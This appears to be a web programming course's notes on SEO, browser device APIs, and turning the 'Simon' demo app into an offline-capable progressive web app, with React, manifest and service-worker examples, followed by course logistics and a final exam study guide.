+You need to properly use HTML elements to correctly define and organize your application. The Google search crawler is an automated bot. That means it will not spend a lot of effort trying to guess what you meant with the `div` or `span` element, when they actually represent a `title` or `a` element. Leveraging the semantic meaning of HTML will help the crawler navigate your content.
+
+You want to make sure that your content is not hidden behind JavaScript interactions. When the crawler hits a URL, the important content should be rendered. The crawler should not have to interact with the application before the content is injected.
+
+Key HTML elements include the `title` and `heading` elements. The title and heading elements should contain text that clearly defines the value of your content, and include keywords that you want in the search index.
+
+## Metadata
+
+HTML defines several elements and attributes that search crawlers specifically target. This includes the `description`, `robots`, social media open graph (`og`), and image alt attributes.
+
+If you were creating a description for Simon, you would include something like the following description meta element on the home page of your application.
+
+```html
+<meta name="description" content="Game play, news, rankings, tips, and instruction for Simon." />
+```
+
+The robots meta element instructs the crawler how to specifically index a given page. The image alt attribute tells the crawler the keywords for a given image.
+
+The open graph (`og`) meta tags are used by social media websites to give a preview of your application. Crawlers consider information like this as a reflection that the application is modern and more interesting to users.
+
+```html
+<meta property="og:title" content="Play Simon online" />
+<meta property="og:description" content="News, rankings, instruction, and competitive online play for Simon." />
+<meta property="og:image" content="https://simon.cs260.click/simon.png" />
+```
+
+### Sitemap
+
+A sitemap is a textual file that you distribute with your application. It describes the major content pieces of your application and aids in search crawler navigation. If you have a small application then a sitemap is probably not necessary. If you have hundreds, or thousands, of content pages then you definitely want to build a sitemap and submit it to the Google Search Console.
+
+Here is an example of a simple sitemap file with a single entry.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
+  <url>
+    <loc>https://simon.cs260.click/news/2022-world-champion.html</loc>
+    <lastmod>2023-01-17</lastmod>
+  </url>
+</urlset>
+```
+
+### Robots.txt
+
+The `robots.txt` file tells the crawler what parts of your application is off limits. Here is an example robots.txt file:
+
+```yaml
+# cs260.com/robots.txt
+# Tell Google not to crawl the game play path,
+# because it won't be useful in Google Search results.
+User-agent: googlebot
+Disallow: /play/
+```
+
+To include a robots.txt file for your application you simply create the file with the specific name `robots.txt` and serve it from the root of your domain.
+
+## Performance and usability
+
+In addition to authority, Google wants to rank results by quality. That means it will check how performant your application is and how good the user experience (UX) is. This includes measurements such as the time it takes for the first byte to load, how long it takes to render the page, and how well your application works on mobile devices.
+
+## Tools
+
+### Google search
+
+You want to frequently do a Google search for your application's domain to see how much of it is being indexed. You can do this by querying Google with your domain name prefixed with `site:`. For example, here is the current result for `site:simon.cs260.click`.
+
+![Simon SEO search](seoGoogleSearch.jpg)
+
+This shows that Google is not indexing any pages from the domain. It looks like we have some SEO work to do. Probably some authoritative links will help.
+
+### PageSpeed Insights
+
+PageSpeed Insights is similar to the Chrome browser debugging tool Lighthouse, but it allows you to run it from a webpage. Using a tool like Insights is helpful because performance and usability are key factors in determining your search ranking. The better the rating you get from PageSpeed Insights, the better your search ranking will be.
+
+Here is the result of examining `simon.cs260.click`. This shows that it is performing well, but that it is not optimal for SEO.
+
+![PageSpeed Insights](seoPageSpeedInsights.jpg)
+
+If we dig into the SEO section of the report we see that there is no Robots.txt file and the description meta element is missing.
+
+![PageSpeed Insights SEO](seoPageSpeedInsightsSeo.jpg)
+
+### Google Search Console
+
+The [Google Search Console](https://search.google.com/search-console/about) contains many tools to help you understand how your application is being indexed and why. This includes information about your website's performance, what pages are indexed, your mobile usability, and information about the site's overall user experience.
+
+![Google Search Console](seoGoogleSearchConsole.jpg)
+
+To get started with the Google Search Console, you need to add a DNS `TXT` record to your application's domain DNS information. This is similar to when you added an `A` or `CNAME` record when you first set up your DNS information with the AWS Route 53 service.
+
+![Google Search Console Verify](seoGoogleSearchConsoleVerify.jpg)
+
+Once your ownership of the domain name is verified, the Google Search Console will start tracking statistics for your domain. Check back often to gain insight on how you can improve your search ranking.
+
+
+
+# Device APIs
+
+<a id="device-api"></a>Device APIs:
+[go to top](#top)
+
+Every year browsers mature and increase the features that they provide. Sometimes these features are exposed as APIs (Application programming interfaces) that allow a web application to interact with the user through browser, operating system, or device features. For example, your application could take advantage of location services that tell you where your user is physically located, or read a user's contacts in order to allow them to share information with their peers. As these APIs become standard across all browsers they enable web applications to behave more and more like historical native device applications.
+
+## Respecting privacy
+
+Most device APIs require the user to consent to your application's use of the API, but as long as your application is providing value and not just trying to invade the user's privacy, that usually isn't a problem. For example, a good use of location services, would be a restaurant finder application that suggests nearby venues. A bad example of using locations services, would be a Sudoku game that sold your home address to advertisers. In some governmental jurisdictions such uses would be considered illegal.
+
+## Location API
+
+📖 **Deeper dive reading**: [MDN Location API](https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API/Using_the_Geolocation_API)
+
+The location API provides the GPS location of the device. Like the notification API, the user will be prompted for permission to access their location. After permission is granted then the `navigator.geolocation` API will return the user's location.
+
+The following React component will display the user's location once it loads.
+
+```jsx
+import React from 'react';
+
+export function Location() {
+  const [position, updatePosition] = React.useState({ lat: 0, long: 0 });
+
+  React.useEffect(() => {
+    console.log('updating pos');
+    navigator.geolocation.getCurrentPosition((p) => {
+      updatePosition({ lat: p.coords.latitude, long: p.coords.longitude });
+    });
+  }, []);
+
+  return (
+    <div>
+      {position.lat !== 0 && (
+        <div>
+          <h1>Your location</h1>
+          <div>Latitude: {position.lat}</div>
+          <div>Longitude: {position.long}</div>
+          <div>
+            <iframe
+              title='map'
+              width='600'
+              height='300'
+              src={`https://www.openstreetmap.org/export/embed.html?bbox=${position.long + 0.001},${
+                position.lat + 0.001
+              },${position.long - 0.001},${position.lat - 0.001}&amp;layer=mapnik`}
+            ></iframe>
+          </div>
+        </div>
+      )}
+      {position.lat === 0 && <div>Location unknown</div>}
+    </div>
+  );
+}
+```
+
+You can try this out by creating a simple React app and adding a new component file named `location.js` that contains the above code. Then include Location component in the `App.js` file.
+
+```jsx
+import { Location } from './location';
+
+function App() {
+  return (
+    <div className='App'>
+      <header className='App-header'>
+        <Location></Location>
+      </header>
+    </div>
+  );
+}
+```
+
+![Location API](locationAPI.jpg)
+
+## Notification API
+
+📖 **Deeper dive reading**: [MDN Notification API](https://developer.mozilla.org/en-US/docs/Web/API/Notifications_API)
+
+As an example of integrating your web application with the device, let's look at the Notification API.
+
+The following React code has a function to register the user's permission to display notifications, and a function to send notifications. The state representing a user's permission is initialized with the Notification API `permission` property. The state of the property can be `default` (not set), `granted`, or `denied`. If a user grants permission then the `Notification` class may be used to actually display a notification.
+
+The rest of the code controls the UI for the display state, buttons, and message input.
+
+```jsx
+function Notifier() {
+  const [acceptanceState, updateAcceptanceState] = React.useState(Notification.permission);
+  const [msg, updateMsg] = React.useState('');
+
+  function register() {
+    Notification.requestPermission().then((response) => {
+      updateAcceptanceState(response);
+    });
+  }
+
+  function notify() {
+    new Notification('You are notified', {
+      body: msg,
+    });
+    updateMsg('');
+  }
+
+  return (
+    <div className='component'>
+      <p>User's acceptance of notifications: {acceptanceState}</p>
+      {acceptanceState === 'default' && <button onClick={() => register()}>Register</button>}
+      {acceptanceState === 'granted' && (
+        <div>
+          <input type='text' value={msg} onChange={(e) => updateMsg(e.target.value)} placeholder='msg here'></input>
+          <button disabled={msg === ''} onClick={() => notify()}>
+            Notify
+          </button>
+        </div>
+      )}
+    </div>
+  );
+}
+```
+
+Here is what the code looks like in action.
+
+![Notification Example](notificationApi.gif)
+
+## Other APIs
+
+Other interesting device APIs include the [Contact Picker](https://developer.mozilla.org/en-US/docs/Web/API/Contact_Picker_API), [Bluetooth](https://developer.mozilla.org/en-US/docs/Web/API/Bluetooth/requestDevice), and [File System](https://developer.mozilla.org/en-US/docs/Web/API/File_System_Access_API).
+
+Before you get too excited about using any device API make sure you check the current browser support for the API so that you can make sure you properly serve your target market. If a specific device is not supported on some device or browser, you can always hide that functionality for those users while still providing it for others.
+
+
+
+# Progressive web application
+
+<a id="pwa"></a>Progressive web application:
+[go to top](#top)
+
+⚠ The information provided here is meant as extended course content. It will not be covered in class or appear on any test.
+
+📖 **Deeper dive reading**:
+
+- [MDN PWA](https://developer.mozilla.org/en-US/docs/Web/Progressive_web_apps)
+- [web.dev PWA](https://web.dev/learn/pwa/)
+
+The idea of creating a single application that works both on desktop and mobile devices is not a new concept. You can trace its origins to Microsoft's introduction of the XMLHttpRequest (XHR) in 1999. XHR allowed web pages to make HTTP requests directly from JavaScript. This evolved into the idea of a web application that could run on any device that supported a web browser. Steve Jobs actually championed the idea of a universal web application when he introduced the iPhone in 2007.
+
+> "you can write amazing Web 2.0 and Ajax apps that look exactly and behave exactly like apps on the iPhone. And these apps can integrate perfectly with iPhone services. And guess what?
+> There’s no SDK that you need! You’ve got everything you need if you know how to write apps using the most modern web standards to write amazing apps for the iPhone today.
+> So developers, we think we’ve got a very sweet story for you. You can begin building your iPhone apps today"
+>
+> — Steve Jobs, (**Source**: [2007 MacWorld keynote](https://youtu.be/VQKMoT-6XSg))
+
+Unfortunately for the world, Apple quickly realized the incredibly lucrative market that existed if they created a closed application space that they controlled. And so in the same year that the iPhone was released, the Apple App Store was born, and software companies were forced to pay Apple 30% of all transactions made on the iPhone.
+
+While the tax on app store participation was unfortunate, the focus on device native applications was even worse. Native apps moved the software industry away from the idea of a universal application platform, to one where developers are forced to create completely different design, functionality, and code for each device. One for iPhone, one for Android, one for each game console, one for each TV vendor, one for the desktop, and so forth. While this is great for the employability of software engineers, it is terrible for software companies and users in general.
+
+When companies, such as Microsoft and Google realized the negative impact that native applications were having on the industry, they began to evangelize a return to standard web technologies that would work on any device. They introduced browser APIs, defined standards, and created frameworks that made it easy to build universal web applications. This technology was eventually branded as `Progressive Web Application` or PWA.
+
+## Advantages of PWA
+
+While PWA builds on the standard core of HTML, CSS, and JavaScript, along with the delivery of content and software updates over HTTP, it takes web applications to the next level, by providing the following benefits.
+
+1. **Works offline** - Using the browser's Service Worker API, a PWA can control the caching of files locally on browser and make it so that the application can run when completely disconnected from the internet. This means that your app will still work when networks are spotty, such as while riding the subway, or when your user is rappelling down a back country slot canyon.
+1. **Fast mobile installation to home screen** - A user no longer has to navigate an app store to find and download a native application. Instead they click on a single button on their device and the PWA will instantly be placed on their home screen. If the app is designed to function offline, it can incrementally cache the necessary files while the user is actually using the application.
+1. **No app store tax** - As companies like [Epic](https://en.wikipedia.org/wiki/Epic_Games_v._Apple) learned through expensive litigation, you must pay if you want to play, in the app store. App stores also use a heavy hand in the submission, approval, and update process. For those companies that are [denied inclusion](https://www.theverge.com/2020/6/16/21293419/hey-apple-rejection-ios-app-store-dhh-gangsters-antitrust) in the app store, there is no recourse. They simply are excluded from that marketplace. PWA technology removes the app store broker from the equation, and allows the software company to deal directly with the consumer.
+1. **Instant updates** - When a PWA needs to push out security fixes, or feature updates, it does not need the app store's approval. The user is also relieved from the complicated and annoying process of keeping dozens of app store installed applications updated. Instead they software provider just update by pushing a new version into production. The next time the user accesses the application they will see the changes.
+1. **Performance** - Because the PWA completely controls the level of browser caching, it can provide high levels of performance that is not dependent on network connectivity constraints. The application instantly reloads on subsequent visits and all the vital resources are already on the user's device.
+1. **Same code base for all devices** - Freed from the overhead of developing and maintaining multiple platforms, software companies can now redeploy their resources to providing functionality that actually benefits the user.
+1. **Better SEO score** - Starting in 2018 Google announced that mobile friendly applications, with PWAs specifically recognized, will have a significantly higher placement is Google search results. If your web application is a native app, then its content is completely excluded from search results. This means that if your application is not a PWA, then you will need to spend more on marketing in order to catch up with competitors.
+
+Finally, PWA technology enables small software companies to successfully compete in the mobile market. According to research provided by Statista (2022), mobile devices generate almost 60% of internet traffic. Those numbers are even higher for Africa (75%) and Asia (69%).
+
+![Mobile usage statistics](mobileUsageStatistics.jpg)
+
+> Source: _[statista](https://www.statista.com/statistics/306528/share-of-mobile-internet-traffic-in-global-regions/)_
+
+With a PWA, a small software company can easily reach mobile device customers, and even provide offline web applications where network coverage is spotty or only sometimes available. This is important even for mature markets, such as the United States, where there are still significant portions of the population that do not have reliable broadband access.
+
+![Broadband availability US](broadbandAvailabilityUS.jpg)
+
+> Source _[US Census Bureau](https://www.census.gov/library/visualizations/2018/comm/broadband.html?cid=embedded_infographic)_
+
+## Where PWAs don't make sense
+
+With all of the advantages of PWAs, there are some situations where a native application is necessary.
+
+1. **Apple incompatibility** - While much of PWA technology works fine with iOS and Safari, Apple is slow to give up their strategic economic advantages. Therefore, some technologies do not yet work as well on the iPhone as they do on other devices. For example, iOS does not support standard push notifications. Additionally, you must use Safari in order to install a PWA to the home screen when using an iPhone. Hopefully, in the near future, Apple will give in to increasing community pressure and enable a better experience for their customers by removing these inconvenient incompatibilities.
+1. **Advanced device features** - A PWA can access a device's location, storage, haptic feedback, contacts, camera, battery, shortcuts, device orientation, fingerprint sensor, and even Bluetooth through [browser supported APIs](https://developer.mozilla.org/en-US/docs/Web/API). However, if an application requires the use of specific device features such as the flashlight or an atmospheric pressure sensor then you might be forced to build a device native application.
+
+## Example PWAs
+
+There are lots of [examples](https://www.simicart.com/blog/progressive-web-apps-examples/) of companies deploying PWAs. This includes brands such as Uber, Pinterest, Rakuten 24, Debenhams, Spotify, Google, BMW, Starbucks, and Flipboard.
+
+### BMW
+
+The results for moving to PWA are impressive. For example, BMW reported the following results after moving to a PWA:
+
+> - 4X increase in people clicking from BMW.com to a BMW sales site
+> - Up to 4X faster site load times
+> - 50% growth in mobile users
+> - 49% more site visits from search engines
+>
+> **Source** - [Think With Google](https://www.thinkwithgoogle.com/intl/en-gb/marketing-strategies/app-and-mobile/bmws-journey-fast-smooth-and-reliable-mobile-website/)
+
+![PWA BMW](pwaDemoBmw.jpg)
+
+### Spotify
+
+Spotify decided to move to a PWA in order to avoid Apple's 30% commission. However, they soon discovered additional benefits from their PWA.
+
+> - Free-to-paid conversions increased 26.6% in 2015, 46% in 2019, and 58.4% in 2021
+> - 30% increase of monthly active users
+> - The number of desktop users rose by 45%
+> - 40% increase of average listening hours per month
+> - UX research reported a more visually appealing, responsive, and adaptable application
+
+When you visit Spotify on a mobile device you are immediately invited to install the PWA to your home screen.
+
+![Spotify install](pwaSpotifyInstall.jpg)
+
+Once added to the home screen, the PWA acts just like a native device application.
+
+![Spotify app](pwaSpotifyMobileApp.jpg)
+
+Additionally, the PWA makes it so that desktop users can install, and have a native application experience. Here is an example of Spotify installed on a MacBook. Notice the lack of the browser's interface, and the inclusion of Spotify's branding in the operating system's controls.
+
+![Spotify app](pwaSpotifyDesktopApp.jpg)
+
+# Steps to make a PWA
+
+One of the best things about PWA technology is that it doesn't require a significant amount of overhead to make your application a PWA. If you have built your application using responsive design techniques (@media, viewport meta, flex, grid, ...) and you have fallback functionality when disconnected, then you only have to take two additional steps. First, you need to provide a manifest that defines the details for displaying your application. Next, you need to write some JavaScript that implements the service worker API in order to cache files for performance and offline ability.
+
+## Manifest and icons
+
+📖 **Deeper dive reading**: [MDN Web app manifests](https://developer.mozilla.org/en-US/docs/Web/Manifest)
+
+A PWA manifest is a JSON file that by convention is usually named `manifest.json`. You link the manifest to your application by including a reference in your `index.html` file. When the browser sees the manifest link, it recognizes the application as a PWA.
+
+```html
+<link rel="manifest" href="manifest.json" />
+```
+
+There are a lot of possible settings you can specify in the manifest. This includes properties such as the application's functional categorize (e.g. education, entertainment, travel), how to display the application (e.g. fullscreen, standalone, minimal-ui), scope (where to load the application from), icons, colors, descriptions, and screenshots for installation.
+
+A minimal manifest might look like the following.
+
+```json
+{
+  "short_name": "Simon",
+  "name": "Simon",
+  "start_url": ".",
+  "display": "standalone",
+  "theme_color": "#000000",
+  "background_color": "#ffffff",
+  "icons": [
+    {
+      "src": "favicon.ico",
+      "sizes": "64x64 32x32 24x24 16x16",
+      "type": "image/x-icon"
+    },
+    {
+      "src": "/android-chrome-512x512.png",
+      "sizes": "512x512",
+      "type": "image/png"
+    },
+    {
+      "src": "/maskable_icon.png",
+      "sizes": "192x192",
+      "type": "image/png",
+      "purpose": "any maskable"
+    }
+  ]
+}
+```
+
+This manifest specifies some basic branding information that tells the browser how to display the application when creating a home screen icon, and what splash screen to generate as the application starts up.
+
+The icons section contains a variety of icons that the device will select from depending upon the context that the application is used in. In order to get full support for icons on iOS devices you also need to include a `apple-touch-icon` link in your `index.html`.
+
+```html
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+```
+
+## Service workers
+
+📖 **Deeper dive reading**: [MDN Service worker API](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API)
+
+The final step for converting your application into a progressive web application involves creating a service working by using the [Service Worker API](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API). Services workers, while not specific to PWAs, allow a web application to do background processing that is not directly associated with the rendering and interaction of a web application. One of the most common uses for a Service Worker is to enabling the browser caching of files for performance reasons. This also makes it so that the PWA keeps working even when it is disconnected from the internet.
+
+To register a service worker, you call the `navigator.serviceWorker` API with the URL to a JavaScript file containing your service worker code.
+
+```js
+navigator.serviceWorker.register('service-worker.js');
+```
+
+The browser will then load and execute the service worker JavaScript. This gives the service worker a chance to register for event handling and specify what files the browser should cache for the application.
+
+You can view the state of your application's service worker using the Chrome dev tools and selecting the `Application` tab.
+
+![Spotify service worker](pwaSpotifyServiceWorker.jpg)
+
+The `Application` tab allows you to remove the service worker, install a new version, generate events, and view cached files.
+
+### The service worker lifecycle
+
+When a service worker is first registered, the browser will immediately load it. This causes your application to be cached on the browser so that it can run offline and not have to load over the network on the user's next use. Since the application is served from the browser's cache, a user will not immediately see new application versions as they are deployed. Instead, they are loaded and put in a waiting state. The service worker remains in the waiting state until all of the browser tabs displaying the application are closed. Then, the next time the user opens the application, they will experience the new version.
+
+You can use the Service Worker settings on the `Application` dev tools tab to skip the waiting period and force the new application version to load immediately.
+
+Your application can also detect that a new version is available and then ask the user if they would like to automatically upgrade to the new version. The browser does that by simply refreshing the browser window.
+
+## Experimenting with PWA
+
+If you would like to see a simple PWA in action, you can use `create-react-app` to generate an template PWA application. From your console window run:
+
+```sh
+npx create-react-app testpwa --template cra-template-pwa
+```
+
+Then open the resulting project found in the `testpwa` directory and modify `index.js` to change `serviceWorkerRegistration.unregister` to `serviceWorkerRegistration.register`. Then build the application with `npm run build` and host the resulting bundled app located in the `build` directory with the VS Code Live Server extension in order to see a minimal working PWA.
+
+## Workbox
+
+📖 **Deeper dive reading**: [Chrome workbox](https://developer.chrome.com/docs/workbox/)
+
+Workbox is an NPM package created by Google for using services workers. The template PWA created `create-react-app`, and the Simon demonstration project, both use workbox to simplify some of the registration, routing, and caching service worker complexities.
+
+
+
+
+# Simon Progressive Web Application
+
+<a id="pwa-simon"></a>Simon PWA:
+[go to top](#top)
+
+⚠ Note that this deliverable is optional and ungraded. The information provided here is meant as extended course content.
+
+![Simon](../simon.png)
+
+This deliverable demonstrates using Progressive Web Application (PWA) technology to integrate with mobile devices.
+
+To covert the last Simon deliverable to a PWA we need to make three modifications.
+
+1. Update the manifest and icons.
+1. Implement and register a service worker. This includes caching the files necessary to run offline.
+1. Implement fallback functionality so the application still works when offline.
+
+## Manifest and icons
+
+We want to make sure that Simon has all the necessary icons required by all major devices. To do this we took the original Simon icon and used [Favicon.io](https://favicon.io/favicon-converter/) to create a complete set of icons. We also created a maskable icon using [Maskable.app](https://maskable.app/editor) for devices that manipulate your icon for display with different shapes and sizes. These icons were then added to the `/public` directory, and references were added to both the `index.html` link elements and the `manifest.json` file.
+
+**index.html**
+
+```html
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+```
+
+**manifest.json**
+
+```js
+{
+  "short_name": "Simon",
+  "name": "Simon",
+  "start_url": ".",
+  "display": "standalone",
+  "theme_color": "#000000",
+  "background_color": "#ffffff",
+  "icons": [
+    {
+      "src": "favicon.ico",
+      "sizes": "64x64 32x32 24x24 16x16",
+      "type": "image/x-icon"
+    },
+    {
+      "src": "/android-chrome-192x192.png",
+      "sizes": "192x192",
+      "type": "image/png"
+    },
+    {
+      "src": "/android-chrome-512x512.png",
+      "sizes": "512x512",
+      "type": "image/png"
+    },
+    {
+      "src": "/maskable_icon.png",
+      "sizes": "192x192",
+      "type": "image/png",
+      "purpose": "any maskable"
+    }
+  ]
+}
+```
+
+## Service worker
+
+In order to get a reasonable service worker implementation we ran `create-react-app` with the `cra-template-pwa` template, and then copied over the `service-worker.js` and `serviceWorkerRegistration.js` files to our Simon project. The registration and service worker code was then stripped down and the necessary Workbox NPM packages installed as follows.
+
+```sh
+npm install workbox-core workbox-expiration workbox-precaching workbox-routing workbox-strategies
+```
+
+The caching implemented in `service-worker.js` first caches the React generated files, and then explicitly caches the sound and icon files used by Simon. This makes it so that all application files are cached on the browser and available for offline use.
+
+The service worker was then set to register with the browser by calling the register function at the end of the `index.jsx` file.
+
+```js
+serviceWorkerRegistration.register();
+```
+
+## Offline fallbacks
+
+Previous deliverables of Simon actually implemented fallback functionality for storing the current user and highest scores. However, we needed to make it so that a previously authenticated user could still play when disconnected from the internet. We also needed a default quote to use if we couldn't reach the third party quote endpoint.
+
+### Authentication
+
+To support remembering the previously authenticated user we removed the code found in `app.jsx` that tried to verify authentication on start up. Instead we simply use the presence of a user name in local storage to designate authentication.
+
+When then modified `authenticated.jsx` to remove the user name from local storage when a user logs out.
+
+```jsx
+function logout() {
+  fetch(`/api/auth/logout`, {
+    method: 'delete',
+  }).then(() => {
+    localStorage.removeItem('userName');
+    props.onLogout();
+  });
+}
+```
+
+The server will still check to make sure we have an authenticated user when an attempt to update the latest high score, but these changes make it so you can still play Simon when disconnected if you were previously authenticated.
+
+Finally we disable login and account creation if we are not connected, and display an error instead.
+
+```jsx
+async function loginOrCreate(endpoint) {
+  try {
+    const response = await fetch(endpoint, {
+      method: 'post',
+      //...
+    });
+    //...
+  } catch {
+    setDisplayError(
+      `⚠ It appears that you are currently offline. You can play Simon offline, but you must be initially online to create or login to your account.`
+    );
+  }
+}
+```
+
+![Offline message](serviceWorkerLoginOffline.jpg)
+
+### Default quote
+
+In `about.jsx` we return a default quote if we cannot connect to the third party quote endpoint.
+
+```jsx
+fetch('https://api.quotable.io/random')
+  .then((response) => response.json())
+  .then((data) => {
+    this.setState({ quote: data.content, quoteAuthor: data.author });
+  })
+  .catch(() => {
+    // Use offline fallback classic quote
+    this.setState({
+      quote: `Always bet on JavaScript`,
+      quoteAuthor: `Brendan Eich`,
+    });
+  });
+```
+
+These changes, combined with the browser caching of all the Simon files, makes the application work reasonably when offline.
+
+## Deployment and testing
+
+During your examination of `serviceWorkerRegistration.js` you might have noticed that it does not register the service worker unless the application has been built in production mode (e.g. with `npm run build`). That means we need to run a production version of the application in order to see if everything is working correctly. The easiest way to do this is to use `deployReact.sh` to push the application to production.
+
+Once you have the application in production you can use the Chrome debug tools to see that the application is registered and running without error. You can turn off the network for the application by selecting the `Offline` option. You can also see all the files that are cached in the `Cache/Storage/Cached Storage` view. To delete the service worker and all cached files associated with the application use the `Application/Storage/Clear Site Data` option.
+
+![Service Worker Debug](serviceWorkerDebug.gif)
+
+When you are confident about how the PWA is working you can run the `Lighthouse` tool found in the Chrome Dev Tools and see if everything is working up to specification. If it displays all `green` then your application should work well on all devices and should be properly search engine optimized (SEOed)).
+
+**Lighthouse report**
+
+![Lighthouse report](serviceWorkerLighthouseReport.jpg)
+
+### Device testing
+
+As a final test you should manually examine the application using the different responsive views that the Dev Tools provide with the Chrome, Safari, and Firefox browsers. Here is what Simon looks like on the Safari browser emulating an iPhone 6. As you can see it is not rendering properly on a small screen.
+
+![iPhone Safari](deviceTestingSafari.jpg)
+
+## Study this code
+
+Get familiar with what the example code teaches.
+
+- Clone the repository to your development environment.
+
+  ```sh
+  git clone https://github.com/webprogramming260/simon-pwa.git
+  ```
+
+- Set up your Atlas credentials in a file named `dbConfig.json` that is in the same directory as `database.js`.
+- Add `dbConfig.json` to your `.gitignore` file so that it doesn't put your credentials into GitHub accidentally.
+- Review the code and get comfortable with everything it represents.
+- View the code in your browser by hosting it from a VS Code debug session. ⚠ Do not use the `live server` extension since your frontend code will now be served up by the Node.js server you created in `index.js`. Set breakpoints in your backend code inside of Visual Studio.
+- Make modifications to the code as desired. Experiment and see what happens.
+
+
+
+# Demo Day
+
+<a id="demo-day"></a>Demo Day:
+[go to top](#top)
+
+## ☑ Assignment - Optional
+
+On the last day of class we will celebrate your amazing work as part of a demo day party where you have the opportunity to showcase your startup application. If you wish to participate then submit the URL of your startup application to the Canvas assignment.
+
+From the submitted applications we will pick the top 10. If your application is selected, and you present it on Demo Day, you will receive an extra 45 points for your startup application. The audience will vote on their favorites and the top 3 will receive the coveted Ghirardelli prize and a letter of recommendation from the Instructor.
+
+![Ghirardelli prize](../../essentials/startup/ghirardelli.png)
+
+
+
+# Wrap up
+
+<a id="wrap-up"></a>Wrap Up:
+[go to top](#top)
+
+We hope that you have enjoyed learning how to build a web application. The concepts you have mastered from this instruction are the same ones that professional software engineers use on a daily basis.
+
+Always remember to continually invest in your tech, art, social, and discovery skills as you make the world a better place.
+
+## Clean up AWS
+
+After everything has been graded, you should consider cleaning up your resources on AWS.
+
+![Clean up meme](turnOffAws.jpg)
+
+- Terminate your EC2 instance ($3.00 - $5.00/month depending upon instance type)
+- Disassoicate and release your elastic IP address ($3.00/month for unassociated instances)
+- Make sure you do not have auto renew set for your domain name ($3.00/year for .click)
+- Delete your Route 53 hosted zone for your domain name ($0.50/month)
+- Clean up your security group and key pair. Note that there is no charge for these.
+
+## ☑ Assignment - Optional
+
+Please take the time to provide us with honest feedback by responding to the university student ratings survey.
+
+If you complete the student ratings survey you will receive 5 bonus points towards your midterm/final grade. In order to receive the bonus you must release your name as part of the survey so that I can see that you completed the survey. Note that releasing your name does not allow me to associate your responses with your name. It only informs me that you completed the survey. Thanks in advance for helping to make the course better.
+
+
+
+
+# Final Exam Study Guide:
+
+
+
+# Final study guide
+
+<a id="final-review"></a>Final Exam Review:
+[go to top](#top)
+
+The final will cover all topics from the end of the JavaScript instruction until the end of class. Here are the details:
+
+- The test is available on online with Canvas during the open dates.
+- You must take taken during the open dates. Consult Canvas for open dates. No late days.
+- Multiple choice format.
+- There is no time limit.
+- The average time to take the test is less than 60 minutes.
+- You may view any notes that you have placed in your Startup repository notes.md file during the test. No other external notes, websites, content, programs, utilities, tools, or other people may be used or referenced.
+- The test focuses on general knowledge of the primary topics. You will need to know the basic syntax and usage of the languages and protocols of interest. This includes, but is not limited to, topics such as HTTP, HTTP requests, web services, database services, authorization services, WebSocket, web application frameworks, and web security.
+- It is highly suggested that you attend, or view, the class review session.
+
+
+
+# NOTE: Once everything is graded, remember to follow instructions under the Wrap Up file to clean up your AWS items to prevent any unwanted charges. DO NOT FORGET TO DO THIS! VERY IMPORTANT!!
